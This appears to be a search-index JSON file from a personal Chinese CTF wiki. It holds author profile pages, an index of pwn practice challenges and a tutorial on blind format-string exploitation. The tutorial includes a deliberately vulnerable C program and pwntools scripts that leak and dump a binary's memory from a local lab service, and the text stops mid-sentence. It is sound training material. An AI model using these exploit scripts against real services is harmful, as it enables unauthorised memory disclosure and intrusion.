{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u5173\u4e8ewiki ___________ _____.___. __ __.__ ____ __.__ / _____/ | _\\__ | | ____ / \\ / \\__| |/ _|__| \\_____ \\| |/ // | |/ __ \\ \\ \\/\\/ / | < | | / \\ < \\____ \\ ___/ \\ /| | | \\| | /_______ /__|_ \\/ ______|\\___ > \\__/\\ / |__|____|__ \\__| \\/ \\/\\/ \\/ \\/ \\/ Site Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231 Chart Email:skye437231@gmail.com","title":"Home"},{"location":"#wiki","text":"___________ _____.___. __ __.__ ____ __.__ / _____/ | _\\__ | | ____ / \\ / \\__| |/ _|__| \\_____ \\| |/ // | |/ __ \\ \\ \\/\\/ / | < | | / \\ < \\____ \\ ___/ \\ /| | | \\| | /_______ /__|_ \\/ ______|\\___ > \\__/\\ / |__|____|__ \\__| \\/ \\/\\/ \\/ \\/ \\/","title":"\u5173\u4e8ewiki"},{"location":"#site","text":"Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231","title":"Site"},{"location":"#chart","text":"Email:skye437231@gmail.com","title":"Chart"},{"location":"about/","text":"___________ _____.___. __ __.__ ____ __.__ / _____/ | _\\__ | | ____ / \\ / \\__| |/ _|__| \\_____ \\| |/ // | |/ __ \\ \\ \\/\\/ / | < | | / \\ < \\____ \\ ___/ \\ /| | | \\| | /_______ /__|_ \\/ ______|\\___ > \\__/\\ / |__|____|__ \\__| \\/ \\/\\/ \\/ \\/ \\/ \u6e23\u6e23\u81ea\u8ff0 \u5e7f\u5dde\u8fa3\u9e21\u4e8c\u672c\u7684\u5927\u4e8c\u751f\uff0c\u8bf7\u5404\u4f4d\u5927\u4f6c\u591a\u591a\u6307\u6559\u3002 Blog\u5199\u4e86\u4ec0\u4e48\u5c31\u53d1\u4ec0\u4e48\uff0c\u5185\u5bb9\u6e23\u4e14\u6742\u3002\u77e5\u8bc6\u6574\u7406\u5728 WiKi \u3002 \u95e8\u6237\u7f51\u7ad9 Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231 \u8054\u7cfb\u65b9\u5f0f Email:skye437231@gmail.com","title":"About"},{"location":"about/#_1","text":"\u5e7f\u5dde\u8fa3\u9e21\u4e8c\u672c\u7684\u5927\u4e8c\u751f\uff0c\u8bf7\u5404\u4f4d\u5927\u4f6c\u591a\u591a\u6307\u6559\u3002 Blog\u5199\u4e86\u4ec0\u4e48\u5c31\u53d1\u4ec0\u4e48\uff0c\u5185\u5bb9\u6e23\u4e14\u6742\u3002\u77e5\u8bc6\u6574\u7406\u5728 WiKi \u3002","title":"\u6e23\u6e23\u81ea\u8ff0"},{"location":"about/#_2","text":"Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231","title":"\u95e8\u6237\u7f51\u7ad9"},{"location":"about/#_3","text":"Email:skye437231@gmail.com","title":"\u8054\u7cfb\u65b9\u5f0f"},{"location":"KnowExam/Know%26Exam/","text":"\u77e5\u8bc6\u70b9&\u9898\u76ee\u7d22\u5f15 \u6574\u6570\u6ea2\u51fa pwn2_sctf_2016 \u8003 \u70b9\uff1a\u6574\u6570\u6ea2\u51fa\u3001ROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU ROP\uff08\u6808\u6ea2\u51fa\uff09 jarvisoj_level3 jarvisoj_tell_me_something jarvisoj_level4 bjdctf_2020_babyrop \u8003 \u70b9\uff1a\u7b80\u5355ROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU ez_pz_hackover_2016 \u8003 \u70b9\uff1a\u7b80\u5355ROP\u3001strcmp \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u94c1\u4eba\u4e09\u9879(\u7b2c\u4e94\u8d5b\u533a)_2018_rop \u8003 \u70b9\uff1a\u7b80\u5355ROP\u3001write \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU jarvisoj_level3_x64 \u8003 \u70b9\uff1aret2csu\u3001write \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u6808\u8fc1\u79fb [Black Watch \u5165\u7fa4\u9898]PWN-spwn \u8003 \u70b9\uff1a\u6808\u8fc1\u79fb \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u8fd9\u6761\u9898\u76ee\u6ce8\u610f puts \u548c write \u6240\u9700\u6808\u7a7a\u95f4\u7684\u5927\u5c0f\u4e0e\u5199\u5165 bss \u7684\u4f4d\u7f6e\u5173\u7cfb ciscn_2019_es_2 \u8003 \u70b9\uff1a\u7b80\u5355\u6808\u8fc1\u79fb \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u6ce8\u610f /bin/sh \u5199\u5165\u4f4d\u7f6e\u4e0e\u6808\u751f\u957f\u65b9\u5411 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 jarvisoj_fm \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u4efb\u610f\u5730\u5740\u5c0f\u6570\u5b57\u8986\u76d6 \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u53ef\u4ee5\u601d\u8003\u4e00\u4e0b\u5982\u679c\u8981\u6c42\u8986\u76d6\u7684\u662f 1 \u600e\u4e48\u6784\u9020 [BJDCTF 2nd]r2t4 \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001__stack_chk_fail \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u4e0e\u6b63\u5e38\u7ed5\u8fc7 canary \u4e0d\u540c\u7684\u662f\uff0c\u6545\u610f\u89e6\u53d1\u62a5\u9519\uff1b\u7559\u6709\u540e\u95e8\uff0c\u96be\u5ea6\u4f4e\u4e8e redpwn2020 dead-canary redpwn2020 dead-canary \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001__stack_chk_fail \u505a\u9898\u7b14\u8bb0\uff1a redpwnCTF 2020 pwn\u90e8\u5206writeup \u5b9e\u9a8c\u73af\u5883\uff1a github \u5907 \u6ce8\uff1a\u4e0e[BJDCTF 2nd]r2t4\u4e00\u6837\u4e3b\u52a8\u89e6\u53d1 canary \uff0c\u6ca1\u6709\u7559\u540e\u95e8\uff0c\u9700\u8981\u81ea\u5df1\u6784\u5efa ROP \u94fe\uff08\u5982\u679c\u7528onegadget\u4e0d\u9700\u8981 ROP\uff09","title":"\u77e5\u8bc6\u70b9&\u9898\u76ee\u7d22\u5f15"},{"location":"KnowExam/Know%26Exam/#_1","text":"","title":"\u77e5\u8bc6\u70b9&amp;\u9898\u76ee\u7d22\u5f15"},{"location":"KnowExam/Know%26Exam/#_2","text":"pwn2_sctf_2016 \u8003 \u70b9\uff1a\u6574\u6570\u6ea2\u51fa\u3001ROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU","title":"\u6574\u6570\u6ea2\u51fa"},{"location":"KnowExam/Know%26Exam/#rop","text":"jarvisoj_level3 jarvisoj_tell_me_something jarvisoj_level4 bjdctf_2020_babyrop \u8003 \u70b9\uff1a\u7b80\u5355ROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU ez_pz_hackover_2016 \u8003 \u70b9\uff1a\u7b80\u5355ROP\u3001strcmp \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u94c1\u4eba\u4e09\u9879(\u7b2c\u4e94\u8d5b\u533a)_2018_rop \u8003 \u70b9\uff1a\u7b80\u5355ROP\u3001write \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU jarvisoj_level3_x64 \u8003 \u70b9\uff1aret2csu\u3001write \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU","title":"ROP\uff08\u6808\u6ea2\u51fa\uff09"},{"location":"KnowExam/Know%26Exam/#_3","text":"[Black Watch \u5165\u7fa4\u9898]PWN-spwn \u8003 \u70b9\uff1a\u6808\u8fc1\u79fb \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u8fd9\u6761\u9898\u76ee\u6ce8\u610f puts \u548c write \u6240\u9700\u6808\u7a7a\u95f4\u7684\u5927\u5c0f\u4e0e\u5199\u5165 bss \u7684\u4f4d\u7f6e\u5173\u7cfb ciscn_2019_es_2 \u8003 \u70b9\uff1a\u7b80\u5355\u6808\u8fc1\u79fb \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u6ce8\u610f /bin/sh \u5199\u5165\u4f4d\u7f6e\u4e0e\u6808\u751f\u957f\u65b9\u5411","title":"\u6808\u8fc1\u79fb"},{"location":"KnowExam/Know%26Exam/#_4","text":"jarvisoj_fm \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u4efb\u610f\u5730\u5740\u5c0f\u6570\u5b57\u8986\u76d6 \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u53ef\u4ee5\u601d\u8003\u4e00\u4e0b\u5982\u679c\u8981\u6c42\u8986\u76d6\u7684\u662f 1 \u600e\u4e48\u6784\u9020 [BJDCTF 2nd]r2t4 \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001__stack_chk_fail \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u4e0e\u6b63\u5e38\u7ed5\u8fc7 canary \u4e0d\u540c\u7684\u662f\uff0c\u6545\u610f\u89e6\u53d1\u62a5\u9519\uff1b\u7559\u6709\u540e\u95e8\uff0c\u96be\u5ea6\u4f4e\u4e8e redpwn2020 dead-canary redpwn2020 dead-canary \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001__stack_chk_fail \u505a\u9898\u7b14\u8bb0\uff1a redpwnCTF 2020 pwn\u90e8\u5206writeup \u5b9e\u9a8c\u73af\u5883\uff1a github \u5907 \u6ce8\uff1a\u4e0e[BJDCTF 2nd]r2t4\u4e00\u6837\u4e3b\u52a8\u89e6\u53d1 canary \uff0c\u6ca1\u6709\u7559\u540e\u95e8\uff0c\u9700\u8981\u81ea\u5df1\u6784\u5efa ROP \u94fe\uff08\u5982\u679c\u7528onegadget\u4e0d\u9700\u8981 ROP\uff09","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32"},{"location":"fmtstr/Bilnd_Pwn/","text":"Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u53ef\u80fd\u9700\u8981\u63d0\u524d\u4e86\u89e3\u7684\u77e5\u8bc6 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u539f\u7406&\u5229\u7528 got & plt \u8c03\u7528\u5173\u7cfb \u7a0b\u5e8f\u7684\u4e00\u822c\u542f\u52a8\u8fc7\u7a0b \u539f\u7406 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7 IDA \u5206\u6790\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP \u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u65e0\u9650\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u628a\u5728\u5185\u5b58\u4e2d\u7684\u7a0b\u5e8f\u7ed9 dump \u4e0b\u6765\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570\uff08\u4e0d\u540c\u4f4d\u6570\u6709\u4e9b\u8bb8\u5dee\u522b\uff09 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528 \u4f7f\u7528\u6761\u4ef6 \u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684 \u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684 \u80fd\u65e0\u9650\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e 32 \u4f4d\u5229\u7528\u624b\u6cd5 \u5b9e\u9a8c\u73af\u5883\u51c6\u5907 \u7a0b\u5e8f\u6e90\u7801\u5982\u4e0b\uff1a #include <stdio.h> #include <string.h> #include <unistd.h> int main(int argc, char *argv[]) { setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); int flag; char buf[1024]; FILE* f; puts(\"What's your name?\"); fgets(buf, 1024, stdin); printf(\"Hi, \"); printf(\"%s\",buf); putchar('\\n'); flag = 1; while (flag == 1){ puts(\"Do you want the flag?\"); memset(buf,'\\0',1024); read(STDIN_FILENO, buf, 100); if (!strcmp(buf, \"no\\n\")){ printf(\"I see. Good bye.\"); return 0; }else { printf(\"Your input isn't right:\"); printf(buf); printf(\"Please Try again!\\n\"); } fflush(stdout); } return 0; } \u7f16\u8bd1 32 \u4f4d\u6587\u4ef6\uff1a gcc -z execstack -fno-stack-protector -m32 -o leakmemory leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10001,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10001) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u60c5\u51b5\u3002 \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u7528 %p \u770b\u770b\u7a0b\u5e8f\u56de\u663e\u8f93\u51fa\u7684\u957f\u5ea6\u662f\u591a\u5c11\uff0c\u4ee5\u6b64\u5224\u65ad\u7a0b\u5e8f\u7684\u4f4d\u6570\u3002\u8fd9\u91cc\u770b\u5230\u56de\u663e\u662f 4 \u4e2a\u5b57\u8282\uff0c\u5224\u65ad\u662f 32 \u4f4d\u7a0b\u5e8f\u3002\u53ef\u4ee5\u518d\u591a\u6cc4\u9732\u51e0\u4e2a\uff0c\u90fd\u662f 4 \u5b57\u8282\uff08\u542b\uff09\u4ee5\u4e0b\u7684\uff0c\u786e\u5b9a\u4e3a 32 \u4f4d\u7a0b\u5e8f\u3002 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb \u627e\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u5728\u540e\u7eed\u64cd\u4f5c\u4e2d\u4f1a\u7528\u5230\u3002\u7531\u4e8e\u6ca1\u6709 binary \u4e0d\u80fd\u901a\u8fc7\u8c03\u8bd5\u5206\u6790\u504f\u79fb\uff0c\u5c31\u91c7\u53d6\u8f93\u5165\u591a\u4e2a %p \u6cc4\u9732\u51fa\u504f\u79fb\u3002\u4e3a\u4e86\u5bb9\u6613\u8fa8\u8ba4\uff0c\u5b57\u7b26\u4e32\u5f00\u59cb\u5148\u586b\u5145 4 \u5b57\u8282 \u7684\u586b\u5145\uff0864\u4f4d8\u5b57\u8282\uff09\uff0c\u7136\u540e\u518d\u586b\u5165 %p \u3002 \u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 7 \u3002 dump \u7a0b\u5e8f dump \u7a0b\u5e8f\u5e94\u8be5\u9009\u54ea\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a %n$s \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5730\u5740\uff0c\u8f93\u51fa\u8fd9\u4e2a\u5730\u5740\u6307\u5411\u7684\u5b57\u7b26\u4e32\u5185\u5bb9 %n$p \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5185\u5bb9\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u8f93\u51fa \u6211\u4eec\u662f\u9700\u8981 dump \u7a0b\u5e8f\uff0c\u4e5f\u5c31\u662f\u60f3\u83b7\u53d6\u6211\u4eec\u6240\u7ed9\u5b9a\u5730\u5740\u7684\u5185\u5bb9\uff0c\u800c\u4e0d\u662f\u83b7\u53d6\u6211\u4eec\u7ed9\u5b9a\u7684\u5730\u5740\u3002\u6240\u4ee5\u5e94\u8be5\u7528 %n$s \u628a\u6211\u4eec\u7ed9\u5b9a\u5730\u5740\u5f53\u4f5c\u6307\u9488\uff0c\u8f93\u51fa\u7ed9\u5b9a\u5730\u5740\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\u3002\u7ed3\u5408\u524d\u9762\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 7 \uff0cpayload \u5e94\u8be5\u4e3a\uff1a %9$s.TMP[addr] \u3002 \u6ce8\u610f \uff1a\u4f7f\u7528 %s \u8fdb\u884c\u8f93\u51fa\u5e76\u4e0d\u662f\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u8f93\u51fa\uff0c\u800c\u662f\u4e00\u76f4\u8f93\u51fa\u76f4\u5230\u9047\u5230 \\x00 \u622a\u6b62\u7b26\u624d\u4f1a\u505c\u6b62\uff0c\u4e5f\u5c31\u662f\u6bcf\u6b21\u6cc4\u9732\u7684\u957f\u5ea6\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u53ef\u80fd\u5f88\u957f\u4e5f\u53ef\u80fd\u662f\u7a7a\u3002\u56e0\u4e3a .text \u6bb5\u5f88\u53ef\u80fd\u6709\u8fde\u7eed \\x00 \uff0c\u6240\u4ee5\u6cc4\u9732\u811a\u672c\u5904\u7406\u60c5\u51b5\u6709\uff1a \u9488\u5bf9\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u4e0d\u7b49\uff0caddr \u6839\u636e\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u52a8\u6001\u589e\u52a0\uff1b \u6cc4\u9732\u5b57\u7b26\u4e32\u53ef\u80fd\u4e3a\u7a7a\uff0c\u4e5f\u5c31\u662f\u5982\u4f55\u5904\u7406 \\x00 \uff1b \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u662f\u6cc4\u9732\u7684\u8d77\u59cb\u5730\u5740\u5728\u54ea\u91cc\uff1f\u4ece\u5404\u4e2a\u5927\u4f6c\u6587\u7ae0\u5b66\u5230\u4e24\u79cd\u505a\u6cd5\uff1a\u4ece .text \u6bb5\u5f00\u59cb\uff1b\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff1b\u4e24\u79cd\u65b9\u6cd5\u6cc4\u9732\u51fa\u6765\u7a0b\u5e8f\uff0c\u5728 ida \u4e2d\u5448\u73b0\u6709\u5dee\u522b\u3002 \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb \u5148\u6765\u8bf4\u7701\u4e8b\u7684\uff0c \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb \u3002\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9 32 \u4f4d\u548c 64 \u4f4d\u5404\u4e0d\u76f8\u540c\uff1a 32 \u4f4d\uff1a\u4ece 0x8048000 \u5f00\u59cb\u6cc4\u9732 64 \u4f4d\uff1a\u4ece 0x400000 \u5f00\u59cb\u6cc4\u9732 \u4e0b\u9762\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u6cc4\u9732\u811a\u672c\uff0c\u7ed3\u5408\u6ce8\u89e3\u5206\u6790\u5982\u4f55\u5904\u7406\u4e0a\u9762\u63d0\u5230\u7684\u95ee\u9898\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii r = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('nameaaa') r.recv() # leak begin = 0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin','wb') as f: f.write(text_seg) \u6ce8\u89e3 \uff1a 19-21 \u884c\uff1a\u5904\u7406\u65e0\u5173\u6cc4\u9732\u7684\u7a0b\u5e8f\u6d41\u7a0b\u540e\uff0c\u8fdb\u5165\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u8f93\u5165\u72b6\u6001 24 \u884c\uff1a32 \u4f4d\u7cfb\u7edf\u52a0\u8f7d\u5730\u5740 9 \u884c\uff1a\"%9$s.TMP\" \u4e2d\u7684 .TMP \u65e2\u662f\u586b\u5145\u5bf9\u9f50\uff0c\u4e5f\u662f\u5206\u9694\u7b26\uff0c\u65b9\u4fbf\u540e\u9762\u5904\u7406\u6570\u636e 14 \u884c\uff1a\u4f7f\u7528binascii \u5c06\u6cc4\u6f0f\u51fa\u6765\u5b57\u7b26\u4e32\u6bcf\u4e00\u4e2a\u90fd\u4ece ascii \u8f6c\u6362\u4e3a \u5341\u516d\u8fdb\u5236\uff0c\u65b9\u4fbf\u663e\u793a 15 \u884c\uff1ar.recvrepeat(0.2) \u63a5\u53d7\u8fd4\u56de\u7684\u5783\u573e\u6570\u636e\uff0c\u65b9\u4fbf\u4e0b\u4e00\u8f6e\u7684\u8f93\u5165 30 \u884c\uff1a\u6cc4\u6f0f\u5730\u5740\u52a8\u6001\u589e\u52a0\uff0c\u5047\u5982\u6cc4\u6f0f 1 \u5b57\u8282\u5c31\u589e\u52a0 1 \uff1b\u6cc4\u6f0f 3 \u5b57\u8282\u5c31\u589e\u52a0 3 31-33 \u884c\uff1a\u5904\u7406\u6cc4\u6f0f\u957f\u5ea6\u4e3a 0 \uff0c\u4e5f\u5c31\u662f\u6570\u636e\u662f \\x00 \u7684\u60c5\u51b5\u3002\u5730\u5740\u589e\u52a0 1 \uff0c\u7a0b\u5e8f\u6570\u636e\u52a0 \\x00 \u8fd0\u884c\u4e4b\u540e\uff0c\u8010\u5fc3\u7b49\u5f85\u6cc4\u6f0f\u5b8c\u6210\u3002\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\u662f\u4e0d\u80fd\u8fd0\u884c\u7684\uff0c\u4f46\u53ef\u4ee5\u5728 ida \u8fdb\u8fc7\u5904\u7406\u53ef\u4ee5\u8fdb\u884c\u5206\u6790\u3001\u627e plt \u3001got.plt \u7b49\u3002 \u5c06\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \uff0c\u542f\u52a8\u65f6\u9009\u62e9 \u4ee5 binary file \u52a0\u8f7d \uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76 \u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048000 \uff08\u5f00\u59cb\u6cc4\u9732\u7684\u5730\u5740\uff09\uff1a \u53ef\u4ee5\u901a\u8fc7 shift+F12 \u67e5\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u7136\u540e\u76f4\u63a5 F5 \u53cd\u7f16\u8bd1\uff1a \u57fa\u672c\u7ed3\u6784\u5df2\u7ecf\u51fa\u6765\u4e86\uff0c\u76f2\u6253\u6ca1\u6709\u6e90\u4ee3\u7801\uff0c\u5c31\u9700\u8981\u6839\u636e\u4f20\u5165\u53c2\u6570\u53bb\u5224\u65ad\u54ea\u4e2a sub_xxx \u662f\u54ea\u4e2a\u51fd\u6570\u4e86\u3002\u6bd4\u5982\u8f93\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684 sub_8048490 \u5c31\u662f printf \u3002 \u4ece .text \u6bb5\u5f00\u59cb \u7a0b\u5e8f\u542f\u52a8\u8fc7\u7a0b\uff1a \u4ece _start \u51fd\u6570\u5f00\u59cb\u5c31\u662f .text \u6bb5\uff0c\u53ef\u4ee5\u5728 ida \u4e2d\u6253\u5f00\u4e00\u4e2a\u6b63\u5e38\u7684 binary \u89c2\u5bdf text \u6bb5\u5f00\u5934\u7b2c\u4e00\u4e2a\u51fd\u6570\u5c31\u662f _stat \uff1a\uff08\u56fe\u4e3a 32 \u4f4d\u7a0b\u5e8f\uff09 \u5148\u7528 %p \u6cc4\u9732\u51fa\u6808\u4e0a\u6570\u636e\uff0c\u627e\u5230\u4e24\u4e2a\u76f8\u540c\u5730\u5740\uff0c\u800c\u4e14\u8fd9\u4e2a\u5730\u5740\u5f88\u9760\u8fd1\u7a0b\u5e8f\u52a0\u8f7d\u521d\u5730\u5740\uff0832\u4f4d\uff1a0x8048000\uff1b64\u4f4d\uff1a0x400000\uff09\u3002\u811a\u672c\u5982\u4e0b\uff1a from pwn import * import sys p = remote('127.0.0.1',10001) p.recv() p.sendline('nameaaa') p.recv() def where_is_start(ret_index=null): return_addr=0 for i in range(400): payload = '%%%d$p.TMP' % (i) p.sendline(payload) p.recvuntil('right:') val = p.recvuntil('.TMP') log.info(str(i*4)+' '+val.strip().ljust(10)) if(i*4==ret_index): return_addr=int(val.strip('.TMP').ljust(10)[2:],16) return return_addr p.recvrepeat(0.2) start_addr=where_is_start() \u6700\u540e\u5728\u504f\u79fb 1164 \u548c 1188 \u627e\u5230 text \u6bb5\u5730\u5740 0x8048510 \uff0c\u53ef\u4ee5\u5bf9\u6bd4\u4e0a\u56fe\uff0c\u4e0a\u56fe\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u622a\u56fe\uff1a \u6cc4\u9732\u811a\u672c\u548c\u524d\u9762\u4e00\u6837\u53ea\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u8d77\u59cb\u5730\u5740\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context.log_level = 'info' r = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('nameaaa') r.recv() # leak begin = 0x8048510 #begin = 0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin_text','wb') as f: f.write(text_seg) \u5c06\u6cc4\u9732\u6587\u4ef6\u653e\u5165 ida \u5206\u6790\uff0c\u542f\u52a8\u65f6\u9009\u62e9 \u4ee5 binary file \u52a0\u8f7d \uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76 \u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048510 \uff08\u5f00\u59cb\u6cc4\u9732\u5730\u5740\uff09\uff1a \u627e\u5230 main \u51fd\u6570\u5728 0x0804860B \uff0c\u9700\u8981\u5c06\u8fd9\u90e8\u5206\u5b9a\u4e49\u4e3a\u51fd\u6570\u624d\u80fd\u53cd\u7f16\u8bd1\uff0c\u53f3\u952e\u5730\u5740\u9694\u58c1\u7684\u540d\u79f0 loc_804860B \uff0ccreat function \u3002 \u7ea2\u8272\u90e8\u5206\u5c31\u662f\u6ca1\u6709\u6cc4\u9732\u51fa\u6765\u7684\u51fd\u6570\uff0c\u540e\u9762\u8ddf\u7684\u5c31\u662f\u51fd\u6570 plt \u5730\u5740\u3002 \u4e24\u79cd\u65b9\u6cd5\u5404\u6709\u4e0d\u540c\uff0c\u7ed3\u5408\u5b9e\u9645\u4f7f\u7528\u3002 \u89e3\u9898\u6d41\u7a0b \u7740\u91cd\u8bb0\u5f55 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \uff0c\u4e0d\u4e00\u6b65\u4e00\u6b65\u5206\u6790\u8fd9\u9053\u9898\u76ee\u6f0f\u6d1e\uff08\u8be6\u7ec6\u5206\u6790\uff1a 